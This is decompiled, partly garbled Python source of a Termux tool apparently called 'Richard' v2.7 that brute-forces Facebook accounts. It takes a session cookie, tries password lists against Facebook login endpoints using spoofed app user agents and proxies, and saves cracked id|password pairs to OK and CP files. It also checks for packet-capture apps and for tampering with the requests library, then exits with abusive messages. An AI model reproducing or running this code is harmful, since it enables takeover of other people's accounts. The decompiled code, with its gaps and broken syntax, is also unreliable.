# Source Generated with Putra Xd
# File: richard.pyc (Python 3.11)
    ...
    for x in range(10):
        ...
        for z in range(200):
            ...
            for z in range(200):
                ...
                import requests
                import zlib
                open('/sdcard/.xx.txt', 'w').write('IF YOU HAVE ANY DATA CAPTURE TOOL THEN DELETE')
...
if os.path.exists(os.path.join(path_canary, package_name)):
    print(f'''DELETE YOUR FUCKING HTTP CANARY FROM {path_canary} ''')
    exit()
...
if os.path.exists(os.path.join(path_canary2, package_name2)):
    print(f'''DELETE YOUR FUCKING HTTP CANARY FROM {path_canary2} ''')
    exit()
...
c = [
    ...
    'marshal',
    'base64']
if not (lambda .0: for word in .0:
word in fuck11None)(c()):
    pass
print('SORRY')
...
if alin != 35223:
    fucker()
    exit('\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
any
fucker()
exit('\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
...
if 'print' not in open(king + 'sessions.py', 'r').read():
    pass
fucker()
exit('\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
fucker()
...
if 'print' not in open(qeen + 'models.py', 'r').read():
    pass
fucker()
exit('\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
any
...
if 'print' not in open(don + 'api.py', 'r').read():
    pass
fucker()
exit('\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
fucker()
exit('\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
king = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if 'sys.stdout.write' not in open(king + 'sessions.py', 'r').read():
    pass
fucker()
exit('\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
any
...
exit('\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
qeen = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if 'sys.stdout.write' not in open(qeen + 'models.py', 'r').read():
    pass
fucker()
exit('\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
fucker()
exit('\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
don = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if 'sys.stdout.write' not in open(don + 'api.py', 'r').read():
    pass
fucker()
exit('\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFUCK BYPASS USER... ')
any
...
if 5 <= current_hour or any < 12:
    greeting = 'GOOD MORNING    :'
if 12 <= current_hour or None < 17:
    greeting = 'GOOD AFTERNOON  :'
if 17 <= current_hour or None < 20:
    greeting = 'GOOD EVENING    :'
greeting = 'GOOD NIGHT     :'
logo = '\x1b[37m  \t\n__________.__       .__                     .___\n\\______   \\__| ____ |  |__ _____ _______  __| _/\n |       _/  |/ ___\\|  |  \\__  \\_  __ \\/ __ | \n |    |   \\  \\  \\___|   Y  \\/ __ \\|  | \\/ /_/ | \n |____|_  /__|\\___  >___|  (____  /__|  \\____ | \n        \\/        \\/     \\/     \\/           \\/\x1b[38;5;196mv2.7 '

def info():
    print('\x1b[37m------------------------------------------------------------\n(\x1b[38;5;196m>>\x1b[37m) DEVLOPER  : \x1b[38;5;46mRICHARDO\x1b[1;37m\n(\x1b[38;5;196m>>\x1b[37m) VERSION   :\x1b[38;5;46m 2.7 \x1b[38;5;46m \x1b[1;37m\n(\x1b[38;5;196m>>\x1b[37m) TOOL TYPE : \x1b[38;5;46mFILE > PUBLIC > RANDOM\n\x1b[37m------------------------------------------------------------')
...
def login_lagi334():
    ...
    print(logo)
    linex()
    cookie = input(f'''\x1b[1;37m[\x1b[38;5;196m>>\x1b[1;37m] \x1b[1;37mCOOKIE :{asu} ''')
    ...
    print('[\x1b[38;5;196mx\x1b[1;37m]FUCK' % p)
    linex()
    print('\x1b[1;37m[\x1b[38;5;196m×\x1b[1;37m] FUCK')
    None(None, None)
    if not None:
        pass
    print('\x1b[1;37m[\x1b[38;5;196m>\x1b[1;37m] \x1b[38;5;196mRUN AGAIN ')
    time.sleep(1)
    exit()
    return None
    if Exception:
        ...
        print('  %s[%sx%s]%s COOKIE EXPIRED....PLEASE INPUT FRESH COOKIE!!%s' % (x, k, x, m, x))
        print(e)
        exit()
        e = None
        del e
...
def result():
    ...
    banner()
    linex()
    print('\x1b[1;37m[\x1b[38;5;196m1\x1b[1;37m] CHECK CP IDZ ')
    ...
    if kz in ('1', '01'):
        ...
        if FileNotFoundError:
            linex()
            animation(' [\x1b[38;5;196m×\x1b[1;37m] FILE NOT FOUND ')
            time.sleep(3)
            back()
        if len(vin) == 0:
            linex()
...
[ f'''{key!s}={value!s}''' ])(p.cookies.get_dict().items()())
        ...
        po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0', data = dataa, cookies = {
            'cookie': koki }, headers = heade, allow_redirects = False, proxies = proxs)
        if 'checkpoint' in po.cookies.get_dict().keys():
            print(f'''\r{P}{K}[{time.strftime('RICHARDO')}-CP] {idf} │ {pw} {P}''')
            open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
            akun.append(idf + '|' + pw)
            cp += 1
            ';'.join
        if 'c_user' in ses.cookies.get_dict().keys():
            ...
            kuki = (lambda .0: for key, value in .0:
[ f'''{key!s}={value!s}''' ])(ses.cookies.get_dict().items()())
            print(f'''\r{P}\x1b[38;5;46m[{time.strftime('RICHARDO')}-OK] {idf} │ {pw} {P}''')
...
def dalvik():
    ...
    fbs = random.choice([
        ...
        'com.facebook.katana',
        'com.facebook.mlite'])
    ua1 = '[FBAN/FB4A;FBAV/' + application_version + ';FBBV/' + application_version_code + ';FBDM/{density=3.375,width=1080,height=2058};FBLC/en_US;FBRV/' + application_version_code + ';FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/' + str(fbs) + ';FBDV/SM-G892A;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]'
    ua2 = '[FBAN/FB4A;FBAV/' + application_version + ';FBBV/' + application_version_code + ';FBDM/{density=3.375,width=1080,height=2058};FBLC/en_US;FBRV/' + application_version_code + ';FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/' + str(fbs) + ';FBDV/SM-G892A;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]'
    ua3 = '[FBAN/FB4A;FBAV/' + application_version + ';FBBV/' + application_version_code + ';FBDM/{density=3.375,width=1080,height=2058};FBLC/en_US;FBRV/' + application_version_code + ';FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/' + str(fbs) + ';FBDV/SM-G892A;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]'
    max = random.choice([
        ua1,
        ua2,
        ua3])
...
def cracker(ids, passlist):
    global ok, cp, loop
    sys.stdout.write(f'''\r\r\x1b[37m[RICHARDO] {loop}|RN \x1b[38;5;46m[OK-:{ok}]''')
    sys.stdout.flush()
    for pas in passlist:
        data = {
            'method': 'auth.login',
